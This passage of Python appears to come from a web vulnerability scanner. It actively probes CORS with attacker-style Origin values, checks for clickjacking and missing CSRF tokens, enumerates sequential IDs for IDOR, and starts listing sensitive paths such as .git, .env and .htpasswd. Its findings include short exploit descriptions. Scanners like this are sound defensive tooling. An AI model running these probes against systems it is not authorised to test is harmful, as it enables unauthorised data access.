        acao = h_lower.get("access-control-allow-origin", "")

        if acao == "*":
            acac = h_lower.get("access-control-allow-credentials", "").lower()
            sev = SEV_HIGH if acac == "true" else SEV_MEDIUM
            findings.append({
                "severity": sev,
                "title": "CORS allows any origin" + (" WITH credentials" if acac == "true" else ""),
                "detail": "Access-Control-Allow-Origin: * permits any website to read responses." +
                          (" Combined with credentials=true, this is exploitable." if acac == "true" else ""),
                "evidence": f"ACAO: {acao}, ACAC: {acac or 'absent'}",
                "exploitable": True,
                "exploit_info": {"type": "cors_misconfiguration",
                                 "method": "Host JS on attacker domain that makes authenticated "
                                           "cross-origin requests to steal data from API responses.",
                                 "risk": "Cross-origin data theft" +
                                         (", authenticated session hijacking" if acac == "true" else "")},
            })

        # ── Reflective CORS probes ─────────────────────────────────
        # Derive a realistic target-domain variant for probes. If the
        # base url is https://example.com, test:
        #   evil-attacker.com          (arbitrary reflection)
        #   example.com.attacker.com   (bad prefix match)
        #   subevil.example.com        (any subdomain trust)
        #   null                       (sandboxed iframes, file://, data:)
        target_netloc = urlparse(url).netloc.lower()
        # Strip port if any
        target_host = target_netloc.split(":", 1)[0]

        probes = [
            ("https://evil-attacker.com",
             "Reflective CORS — arbitrary origin accepted",
             "Server reflects any Origin header in ACAO.",
             SEV_HIGH),
            (f"https://{target_host}.evil-attacker.com",
             "Reflective CORS — bad prefix-match trust",
             (f"ACAO trusts any origin that starts with {target_host} "
              f"— 'startsWith(target)' check is the classic misconfig."),
             SEV_HIGH),
            (f"https://evilsub.{target_host}",
             "Reflective CORS — all-subdomains trust",
             (f"ACAO trusts any subdomain of {target_host}. A single "
              f"XSS / takeover on any subdomain pivots into full "
              f"cross-origin read of this API."),
             SEV_MEDIUM),
            ("null",
             "CORS trusts Origin: null",
             ("Origin: null is produced by sandboxed iframes, "
              "file:// origins, and data: URIs. Trusting it means "
              "any embedded iframe can read this API with the user's "
              "credentials."),
             SEV_HIGH),
        ]

        for probe_origin, title, detail, sev in probes:
            if shutdown_requested():
                break
            try:
                resp = self._session.get(url, allow_wayback=False,
                                         headers={"Origin": probe_origin})
            except Exception:
                continue
            if not resp:
                continue
            reflected = resp.headers.get("Access-Control-Allow-Origin", "")
            if reflected == probe_origin:
                acac_p = resp.headers.get(
                    "Access-Control-Allow-Credentials", "").lower()
                with_creds = (acac_p == "true")
                # If creds are reflected too, bump to CRITICAL.
                eff_sev = (
                    SEV_CRITICAL if with_creds and sev in (SEV_HIGH, SEV_MEDIUM)
                    else sev
                )
                findings.append({
                    "severity": eff_sev,
                    "title": title + (" (with credentials)" if with_creds else ""),
                    "detail": (f"{detail} "
                               + ("ACAC=true reflected — full "
                                  "credentialed exfil is exploitable."
                                  if with_creds else "")),
                    "evidence": (f"Sent Origin: {probe_origin} → "
                                 f"ACAO: {reflected}"
                                 f"{', ACAC: true' if with_creds else ''}"),
                    "exploitable": True,
                    "exploit_info": {
                        "type": "cors_misconfiguration",
                        "method": (f"Attacker page with Origin: "
                                   f"{probe_origin} can fetch this "
                                   f"endpoint" +
                                   (" with the victim's cookies"
                                    if with_creds else "") +
                                   " and read the body."),
                        "risk": ("Authenticated data theft, API abuse"
                                 if with_creds
                                 else "Cross-origin data theft"),
                    },
                })
                # Only emit the first positive — don't pile them on
                # every probe.
                break
        return findings

    def _check_info_disclosure(self, headers: dict, html: str) -> List[dict]:
        """Check for information disclosure in headers and HTML.

        HTTP header names are case-insensitive (RFC 9110 §5.1), but
        plain-dict lookups are not. Build a lower-keyed snapshot so a
        server emitting 'server:' instead of 'Server:' doesn't silently
        slip past these checks.
        """
        findings = []
        h_lower = {k.lower(): v for k, v in headers.items()}

        # Server version strings
        server = h_lower.get("server", "")
        if server and re.search(r"\d+\.\d+", server):
            findings.append({"severity": SEV_LOW, "title": "Server version disclosed",
                             "detail": f"Server header reveals version info. Aids attacker reconnaissance.",
                             "evidence": f"Server: {server[:80]}"})

        powered = h_lower.get("x-powered-by", "")
        if powered:
            findings.append({"severity": SEV_LOW, "title": "X-Powered-By header present",
                             "detail": "Technology stack revealed. Remove this header.",
                             "evidence": f"X-Powered-By: {powered[:80]}"})

        # Debug headers
        for debug_h in ["X-Debug-Token", "X-Debug-Info", "X-Debug-Link"]:
            if debug_h.lower() in h_lower:
                findings.append({"severity": SEV_HIGH, "title": f"Debug header present: {debug_h}",
                                 "detail": "Debug mode likely enabled in production.",
                                 "evidence": f"{debug_h} header found"})

        # Stack traces in HTML
        stack_patterns = [
            (re.compile(r"Traceback \(most recent call last\)", re.I), "Python stack trace"),
            (re.compile(r"at\s+\w+\.\w+\([\w.]+:\d+\)", re.I), "Java/.NET stack trace"),
            (re.compile(r"Fatal error:.*on line \d+", re.I), "PHP fatal error"),
            (re.compile(r"Exception in thread", re.I), "Java exception"),
        ]
        for pat, desc in stack_patterns:
            if pat.search(html[:20000]):
                findings.append({"severity": SEV_HIGH, "title": f"Stack trace in response: {desc}",
                                 "detail": "Error details visible to users. Reveals internal paths, "
                                           "library versions, and potential attack vectors.",
                                 "evidence": desc})
                break

        return findings

    def _check_clickjacking(self, headers: dict) -> List[dict]:
        """Check clickjacking protection."""
        h = {k.lower(): v for k, v in headers.items()}
        xfo = h.get("x-frame-options", "")
        csp = h.get("content-security-policy", "")

        # CSP directive names are case-insensitive per spec; the literal
        # substring check previously only matched lowercase.
        if not xfo and "frame-ancestors" not in csp.lower():
            return [{"severity": SEV_MEDIUM, "title": "Clickjacking possible",
                     "detail": "No X-Frame-Options or CSP frame-ancestors. "
                               "Page can be embedded in attacker-controlled iframes to "
                               "trick users into clicking hidden buttons/links.",
                     "evidence": "Neither X-Frame-Options nor frame-ancestors directive found",
                     "exploitable": True,
                     "exploit_info": {"type": "clickjacking",
                                      "method": "Create page with hidden iframe embedding target. "
                                                "Overlay fake UI to trick clicks on real buttons.",
                                      "risk": "UI redressing, unauthorized actions, fund transfers"}}]
        return []

    def _check_csrf(self, html: str) -> List[dict]:
        """Check if forms lack CSRF protection."""
        findings = []
        if not HAS_BS4 or not html:
            return findings
        try:
            soup = BeautifulSoup(html[:100000], "html.parser")
            csrf_names = {"csrf", "token", "_token", "csrfmiddlewaretoken",
                          "csrf_token", "authenticity_token", "__requestverificationtoken",
                          "nonce", "_csrf", "xsrf"}
            for form in soup.find_all("form"):
                method = (form.get("method", "GET")).upper()
                if method != "POST":
                    continue
                action = form.get("action", "")
                inputs = {inp.get("name", "").lower() for inp in form.find_all("input")}
                has_csrf = bool(inputs & csrf_names)
                if not has_csrf:
                    form_desc = action[:40] if action else "(same page)"
                    findings.append({
                        "severity": SEV_MEDIUM,
                        "title": f"POST form without CSRF token: {form_desc}",
                        "detail": "Form submits via POST without an anti-CSRF token. "
                                  "Attacker can craft a page that auto-submits this form "
                                  "when the victim visits it.",
                        "evidence": f"POST form action={form_desc}, no CSRF token field found",
                        "exploitable": True,
                        "exploit_info": {
                            "type": "csrf",
                            "method": "Create attacker page with hidden form that auto-submits "
                                      "to the target action. Victim's session cookies are sent "
                                      "automatically by the browser.",
                            "risk": "Unauthorized actions, account modification, fund transfers",
                        },
                    })
                    if len(findings) >= 3:
                        break
        except Exception:
            pass
        return findings

    def _check_idor(self, base_url: str, html: str) -> List[dict]:
        """Check for Insecure Direct Object Reference indicators."""
        findings = []
        domain = urlparse(base_url).netloc
        if self._session.is_domain_blocked(domain):
            return findings

        # Look for sequential numeric IDs in URLs
        id_params = re.findall(r'[?&]((?:id|user_id|uid|account|order|item|doc|file_id|record)'
                               r')=(\d+)', html[:100000], re.I)
        if not id_params:
            return findings

        # Test: compare baseline to id+1 AND id-1. Both need to return
        # 200 with DIFFERENT content from the baseline for a real IDOR
        # signal (otherwise it's likely the same page regardless of ID).
        # Login-wall responses are filtered: status==200 + a denial phrase
        # is skipped.
        _idor_deny = re.compile(
            r"(?:access\s+denied|permission\s+denied|unauthori[sz]ed|"
            r"please\s+(?:log|sign)\s+in|login\s+required)",
            re.I,
        )
        tested = set()
        for param_name, param_val in id_params[:3]:
            key = f"{param_name}:{param_val}"
            if key in tested:
                continue
            tested.add(key)
            try:
                val = int(param_val)
            except ValueError:
                continue

            orig_url = f"{base_url}?{param_name}={val}"
            orig_resp = self._session.get(orig_url, allow_wayback=False)
            if not orig_resp or orig_resp.status_code != 200 or not orig_resp.text:
                continue
            if _idor_deny.search(orig_resp.text[:4000]):
                continue

            hits: List[Tuple[int, float]] = []
            for offset in (1, -1, 2, 10):
                target_id = val + offset
                if target_id <= 0:
                    continue
                t_url = f"{base_url}?{param_name}={target_id}"
                t_resp = self._session.get(t_url, allow_wayback=False)
                if not t_resp or t_resp.status_code != 200 or not t_resp.text:
                    continue
                if _idor_deny.search(t_resp.text[:4000]):
                    continue
                diff = self._response_diff(orig_resp.text, t_resp.text)
                if not diff["similar"] and diff["score"] > 0.3:
                    hits.append((target_id, diff["score"]))

            # Require at least TWO distinct IDs to return different-but-
            # similar content before flagging. One off-by-one could be
            # coincidence; two is a pattern.
            if len(hits) >= 2:
                ids_s = ", ".join(str(h[0]) for h in hits)
                findings.append({
                    "severity": SEV_HIGH,
                    "title": f"Possible IDOR via '{param_name}' parameter",
                    "detail": (f"Sequential IDs return different content "
                               f"(baseline={val}, other IDs: {ids_s}). "
                               f"Access control appears absent — test "
                               f"with an unauthenticated session to "
                               f"confirm."),
                    "evidence": (f"param: {param_name}, baseline={val}, "
                                 f"others={ids_s} — all return 200 with "
                                 f"different bodies"),
                    "exploitable": True,
                    "exploit_info": {
                        "type": "idor",
                        "parameter": param_name,
                        "method": (f"Enumerate '{param_name}' (for/while "
                                   f"range) to access other users' data. "
                                   f"Also test with your session cookie "
                                   f"removed — if IDs still return data, "
                                   f"there's no auth check."),
                        "risk": "Unauthorized data access, privacy violation, data theft",
                    },
                })
                break
        return findings

    # Per-path content validators: given a path and the response body,
    # returns True iff the body looks like the real artefact (not a
    # soft-404 or login-wall). Only paths where blind HTTP-200 is
    # noisy need a validator here.
    _PATH_CONTENT_VALIDATORS = {
        "/.git/HEAD": lambda b: "ref:" in b[:100] or _re_hex40.match(b.strip()),
        "/.git/config": lambda b: "[core]" in b[:200] or "[remote" in b[:200],
        "/.git/logs/HEAD": lambda b: _re_git_log.search(b[:500]) is not None,
        "/.svn/entries": lambda b: b.strip()[:4].isdigit() or "<?xml" in b[:100],
        # SQLite's magic bytes are "SQLite format 3\0"; once decoded
        # as text the NUL survives, but we only check the printable
        # prefix to stay resilient to charset coercion.
        "/.svn/wc.db": lambda b: "SQLite format 3" in b[:32],
        "/.env": lambda b: _re_env_line.search(b[:2000]) is not None,
        "/.env.local": lambda b: _re_env_line.search(b[:2000]) is not None,
        "/.env.production": lambda b: _re_env_line.search(b[:2000]) is not None,
        "/.env.development": lambda b: _re_env_line.search(b[:2000]) is not None,
        "/.env.backup": lambda b: _re_env_line.search(b[:2000]) is not None,
        "/.env.bak": lambda b: _re_env_line.search(b[:2000]) is not None,
        "/.htpasswd": lambda b: ":" in b[:200] and _re_htpasswd.search(b[:2000]) is not None,
        "/phpinfo.php": lambda b: "phpinfo()" in b[:5000] or "PHP Version" in b[:5000],
        "/info.php": lambda b: "phpinfo()" in b[:5000] or "PHP Version" in b[:5000],
        "/server-status": lambda b: "Apache Server Status" in b[:500] or "Total accesses" in b[:500],
        "/server-info": lambda b: "Apache Server Information" in b[:500],
        "/nginx_status": lambda b: b.strip().startswith("Active connections:"),
        "/stub_status": lambda b: b.strip().startswith("Active connections:"),
        "/swagger.json": lambda b: '"swagger"' in b[:200] or '"openapi"' in b[:200],
        "/openapi.json": lambda b: '"openapi"' in b[:200] or '"swagger"' in b[:200],
        "/v2/api-docs": lambda b: '"swagger"' in b[:200] or '"openapi"' in b[:200],
